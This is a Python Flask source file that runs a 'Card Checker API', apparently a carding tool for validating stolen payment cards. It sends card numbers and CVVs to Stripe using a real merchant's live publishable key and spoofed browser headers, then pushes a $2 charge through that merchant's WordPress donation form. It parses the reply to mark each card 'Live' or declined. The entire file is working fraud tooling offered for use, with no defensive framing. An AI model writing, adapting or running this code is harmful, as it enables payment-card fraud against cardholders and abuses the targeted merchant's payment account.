from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({
        'status': 'running',
        'message': 'Card Checker API',
        'endpoints': {
            'check': '/api/check (POST)',
            'health': '/ (GET)'
        }
    })

@app.route('/api/check', methods=['POST'])
def check_card():
    try:
        data = request.json
        card = data.get('card', '').strip()
        month = data.get('month', '').strip()
        year = data.get('year', '').strip()
        cvv = data.get('cvv', '').strip()
        
        # Block Amex
        if card.startswith('34') or card.startswith('37'):
            return jsonify({
                'status': 'declined',
                'message': 'American Express Not Supported',
                'code': 'amex_not_supported'
            })
        
        # Step 1: Create Payment Method
        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        stripe_payload = (
            f'type=card'
            f'&card[number]={card}'
            f'&card[cvc]={cvv}'
            f'&card[exp_month]={month.zfill(2)}'
            f'&card[exp_year]={year}'
            f'&guid=4236e845-16a9-4d3d-afe0-0fe2dddf9f69771298'
            f'&muid=31be8430-611d-4f25-aee5-70167706cc5fe1f95a'
            f'&sid=edd3efea-32d6-4245-b2c1-737f7fd92f1681cc2c'
            f'&pasted_fields=number'
            f'&payment_user_agent=stripe.js%2Ff4aa9d6f0f%3B+stripe-js-v3%2Ff4aa9d6f0f%3B+card-element'
            f'&referrer=https%3A%2F%2Fallcoughedup.com'
            f'&time_on_page=39675'
            f'&client_attribution_metadata[client_session_id]=fb44e875-4918-4bc1-afba-dad21ab1b01c'
            f'&client_attribution_metadata[merchant_integration_source]=elements'
            f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
            f'&client_attribution_metadata[merchant_integration_version]=2017'
            f'&key=pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV'
        )
        
        response_stripe = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers_stripe,
            data=stripe_payload,
            timeout=30
        )
        
        if response_stripe.status_code != 200:
            error_msg = response_stripe.json().get('error', {}).get('message', 'Invalid card')
            return jsonify({
                'status': 'declined',
                'message': f'Card Invalid - {error_msg}',
                'code': 'invalid_card'
            })
        
        payment_method_id = response_stripe.json()["id"]
        
        # Step 2: Charge Card
        cookies = {
            '__stripe_mid': '31be8430-611d-4f25-aee5-70167706cc5fe1f95a',
            '__stripe_sid': 'edd3efea-32d6-4245-b2c1-737f7fd92f1681cc2c',
        }
        
        headers_charge = {
            'authority': 'allcoughedup.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://allcoughedup.com',
            'referer': 'https://allcoughedup.com/registry/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        charge_payload = {
            'data': f'__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce=cf508a7103&_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=Anonymous&email=anonymous%40gmail.com&custom-payment-amount=2&description=Enjoy&payment_method=stripe&__stripe_payment_method_id={payment_method_id}',
            'action': 'fluentform_submit',
            'form_id': '4',
        }
        
        params = {
            't': '1768136422667',
        }
        
        response_charge = requests.post(
            'https://allcoughedup.com/wp-admin/admin-ajax.php',
            params=params,
            cookies=cookies,
            headers=headers_charge,
            data=charge_payload,
            timeout=45
        )
        
        result_text = response_charge.text.lower()
        
        # Response detection
        if 'success' in result_text or 'thank' in result_text:
            return jsonify({
                'status': 'approved',
                'message': 'Card Live - Charged $2',
                'code': 'approved'
            })
        elif 'insufficient' in result_text or 'funds' in result_text:
            return jsonify({
                'status': 'approved',
                'message': 'Card Live - Insufficient Funds',
                'code': 'insufficient_funds'
            })
        elif 'decline' in result_text or 'declined' in result_text:
            return jsonify({
                'status': 'declined',
                'message': 'Card Declined',
                'code': 'card_declined'
            })
        elif 'security code' in result_text or 'cvc' in result_text:
            return jsonify({
                'status': 'approved',
                'message': 'Card Live - CVV Incorrect',
                'code': 'incorrect_cvc'
            })
        elif 'expired' in result_text:
            return jsonify({
                'status': 'declined',
                'message': 'Card Expired',
                'code': 'expired_card'
            })
        else:
            return jsonify({
                'status': 'unknown',
                'message': 'Unknown Response',
                'code': 'unknown'
            })
            
    except requests.exceptions.Timeout:
        return jsonify({
            'status': 'error',
            'message': 'Request Timeout',
            'code': 'timeout'
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Error: {str(e)}',
            'code': 'exception'
        })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
